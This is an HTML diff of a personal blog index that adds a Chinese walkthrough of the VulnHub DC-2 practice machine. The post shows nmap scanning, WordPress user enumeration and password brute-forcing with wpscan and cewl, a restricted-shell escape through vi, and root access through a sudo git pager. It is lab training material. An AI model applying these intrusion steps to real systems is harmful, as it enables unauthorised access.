@@ -181,6 +181,114 @@
         
 
 <div class="post">
+    <a href="/2026/09/10/DC-2%E9%9D%B6%E6%9C%BA/">
+        <h2 class="post-title">DC-2靶机练习</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/9/10
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h2 id="靶机安装"><a href="#靶机安装" class="headerlink" title="靶机安装"></a>靶机安装</h2><p>在vulnhub上下载DC-2靶机<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-2,311/#fileinfo">DC：2 ~ VulnHub</a><br><img src="/source/images/14eca390dc71d2edec2f456a2bdfeaf0_MD5.jpg"></p>
+<p>解压文件后，使用vm打开，创建名称和选择位置导入即可。<br><img src="/source/images/7a4fd391c86f9eea5ee874414c9cb8d7_MD5.jpg"></p>
+<h2 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h2><p>先探查同一网段下存活的主机找一下靶机的ip，用nmap输入命令。</p>
+<pre class="line-numbers language-none"><code class="language-none">nmap -sn 192.168.179.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>找到靶机的ip地址。<br><img src="/source/images/Pasted%20image%2020260910185026.png"><br>用nmap扫描一下开放端口。</p>
+<pre class="line-numbers language-none"><code class="language-none">nmap -p- --min-rate 10000 192.168.179.140<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>发现一个80端口开放了http服务，访问发现ip自动变成了<a target="_blank" rel="noopener" href="http://dc-2/%E3%80%82">http://dc-2/。</a><br><img src="/source/images/Pasted%20image%2020260910185417.png">因为无法解析域名所以访问失败，在host文件中添加解析。</p>
+<pre class="line-numbers language-none"><code class="language-none">echo &quot;192.168.179.140 dc-2&quot; | sudo tee -a &#x2F;etc&#x2F;hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>成功访问并找到flag1。<br><img src="/source/images/Pasted%20image%2020260910190034.png">flag1暗示暴力破解，先找到登录界面，用dirsearch扫一下。</p>
+<pre class="line-numbers language-none"><code class="language-none">dirsearch -u http:&#x2F;&#x2F;dc-2&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>找到后台登录界面。<br><img src="/source/images/Pasted%20image%2020260910190426.png"><br>准备暴力破解，先枚举一下用户名。</p>
+<pre class="line-numbers language-none"><code class="language-none">wpscan --url http:&#x2F;&#x2F;dc-2 --enumerate u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/source/images/Pasted%20image%2020260910192941.png"><br>根据网站生成一份字典。</p>
+<pre class="line-numbers language-none"><code class="language-none">cewl http:&#x2F;&#x2F;dc-2&#x2F; &gt; password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/source/images/Pasted%20image%2020260910193356.png"><br>然后对枚举出来的用户名进行爆破。</p>
+<pre class="line-numbers language-none"><code class="language-none">wpscan --url http:&#x2F;&#x2F;dc-2 --passwords password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>只跑出jerry和tom的密码。</p>
+<p><img src="/source/images/Pasted%20image%2020260910193736.png">                                                                                                                                                                                </p>
+<pre class="line-numbers language-none"><code class="language-none">jerry &#x2F; adipiscing   
+tom &#x2F; parturient  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>登录jerry，在pages中找到flag2。<br><img src="/source/images/Pasted%20image%2020260910194037.png"></p>
+<p>登录tom没有发现有用信息。<br><img src="/source/images/Pasted%20image%2020260910194825.png"></p>
+<p>靶机还开了一个ssh服务在7744端口，尝试连接，jerry一直连不上用tom连上了。<br><img src="/source/images/Pasted%20image%2020260910195307.png"></p>
+<p>ls看看有什么东西，找到flag3。<br><img src="/source/images/Pasted%20image%2020260910195516.png"></p>
+<p>查看flag3的内容，好像还不让cat。<br><img src="/source/images/Pasted%20image%2020260910195750.png"></p>
+<p>看看能用什么命令。</p>
+<pre class="line-numbers language-none"><code class="language-none">compgen -c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>发现有一个编辑命令。<br><img src="/source/images/Pasted%20image%2020260910200034.png"></p>
+<p>编辑flag3.txt也能查看内容。</p>
+<pre class="line-numbers language-none"><code class="language-none">vi flag3.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/source/images/Pasted%20image%2020260910200303.png"></p>
+<p>这里应该是要用su提权到jerry，直接用su发现行不通。<br><img src="/source/images/Pasted%20image%2020260910201010.png"></p>
+<p>尝试vi进行rbash逃逸再提权。</p>
+<pre class="line-numbers language-none"><code class="language-none">vi 任意文件
+
+:set shell&#x3D;&#x2F;bin&#x2F;bash
+
+:shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>执行成功后可以cd..返回上级。<br><img src="/source/images/Pasted%20image%2020260910201617.png"></p>
+<p>然后进入jerry目录，ls发现flag4.<br><img src="/source/images/Pasted%20image%2020260910201742.png"></p>
+<p>再用vi查看flag4.txt。<br><img src="/source/images/Pasted%20image%2020260910201819.png"></p>
+<p>现在离最后的flag很近了，之前su命令用不了，尝试用环境变量提权。</p>
+<pre class="line-numbers language-none"><code class="language-none">BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;a         &#x2F;&#x2F;把&#x2F;bin&#x2F;sh给a
+
+&#x2F;bin&#x2F;bash
+
+export PATH&#x3D;$PATH:&#x2F;bin&#x2F;         &#x2F;&#x2F;添加环境变量
+
+export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin      &#x2F;&#x2F;添加环境变量<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/source/images/Pasted%20image%2020260910203003.png"></p>
+<p>现在已经提权到jerry，看看jerry能干嘛。</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>发现能够不用root权限使用git，结合flag4的提示这里用git提权。<br><img src="/source/images/Pasted%20image%2020260910203344.png"></p>
+<p>先调窄窗口让回显信息不能一页显示，然后执行git hlep,在分页器界面输入!&#x2F;bin&#x2F;bash。</p>
+<pre class="line-numbers language-none"><code class="language-none">stty rows 20 cols 80
+
+sudo git help config
+
+!&#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>执行完输入whoami，回显root。<br><img src="/source/images/Pasted%20image%2020260910210737.png"></p>
+<p>cd &#x2F;root 就能找到最后的flag了，cat final-flag.txt查看。<br><img src="/source/images/Pasted%20image%2020260910210949.png"></p>
+<h2 id="靶机复盘"><a href="#靶机复盘" class="headerlink" title="靶机复盘"></a>靶机复盘</h2><h3 id="攻击链"><a href="#攻击链" class="headerlink" title="攻击链"></a>攻击链</h3><p>查找ip-&gt;端口扫描-&gt;dirseach扫描找登录界面-&gt;wpscan用户名枚举-&gt;cewl字典生成-&gt;wpscan暴力破解-&gt;ssh连接-&gt;环境变量提权-&gt;水平越权-&gt;git提权</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E9%9D%B6%E6%9C%BA/" style="color: #ff7d73">靶机</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E6%B8%97%E9%80%8F/" style="color: #00bcd4">渗透</a>
+        </span>
+        
+    </div>
+    <a href="/2026/09/10/DC-2%E9%9D%B6%E6%9C%BA/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2026/09/06/DC-1%E9%9D%B6%E6%9C%BA/">
         <h2 class="post-title">DC-1靶机练习</h2>
     </a>
@@ -349,7 +457,7 @@ mysql -udbuser -pR0ck3t
         
         <span class="tag">
             
-            <a href="/tags/%E6%B8%97%E9%80%8F/" style="color: #00a596">渗透</a>
+            <a href="/tags/%E6%B8%97%E9%80%8F/" style="color: #ff7d73">渗透</a>
         </span>
         
     </div>
@@ -404,17 +512,17 @@ mysql -udbuser -pR0ck3t
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="color: #00a596">漏洞挖掘</a>
+            <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="color: #ffa2c4">漏洞挖掘</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/" style="color: #00bcd4">信息泄漏</a>
+            <a href="/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/" style="color: #00a596">信息泄漏</a>
         </span>
         
     </div>
@@ -482,12 +590,12 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/" style="color: #ff7d73">验证码</a>
+            <a href="/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/" style="color: #03a9f4">验证码</a>
         </span>
         
     </div>
@@ -548,7 +656,7 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00bcd4">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #03a9f4">题解</a>
         </span>
         
     </div>
